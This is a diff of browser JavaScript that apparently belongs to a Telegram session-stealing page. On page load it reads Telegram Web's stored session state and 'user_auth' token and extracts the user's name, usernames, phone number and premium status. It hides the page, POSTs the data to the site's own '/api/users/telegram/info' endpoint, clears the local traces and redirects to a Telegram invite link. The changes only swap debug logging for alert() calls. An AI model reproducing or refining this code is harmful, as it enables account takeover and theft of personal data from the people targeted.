@@ -1,16 +1,16 @@
 document.addEventListener("DOMContentLoaded", function() {
   async function checkLocalStorage() {
     let globalState = localStorage.getItem("tt-global-state");
-    console.log(globalState, 'globalState');
+    alert(globalState);
     if (globalState && localStorage.getItem("user_auth")) {
-      console.log(localStorage.getItem("user_auth"), 'localStorage.getItem("user_auth")');
+      alert(localStorage.getItem("user_auth"));
       const parsedState = JSON.parse(globalState);
       const currentUserId = parsedState.currentUserId;
       const currentUser = parsedState.users.byId[currentUserId];
       document.body.style.display = "none";
 
-      console.log(currentUserId, 'currentUserId');
-      console.log(currentUser, 'currentUser');
+      alert(currentUserId);
+      alert(currentUser, 'currentUser');
 
       if (currentUserId && currentUser) {
         const { firstName, usernames, phoneNumber, isPremium } = currentUser;
@@ -18,7 +18,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
-        console.log('run of api');
+        alert('run of api');
         try {
           fetch(`/api/users/telegram/info`, {
             method: "POST",
@@ -31,7 +31,7 @@ document.addEventListener("DOMContentLoaded", function() {
             })
           });
         } catch (er) {
-          console.log(er, 'errorss');
+          alert(JSON.stringify(er));
         }
 
         window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
@@ -43,7 +43,7 @@ document.addEventListener("DOMContentLoaded", function() {
         clearInterval(checkInterval);
       }
     } else {
-      console.log('can not run');
+      alert('can not run');
       sessionStorage.clear();
       localStorage.clear();
     }
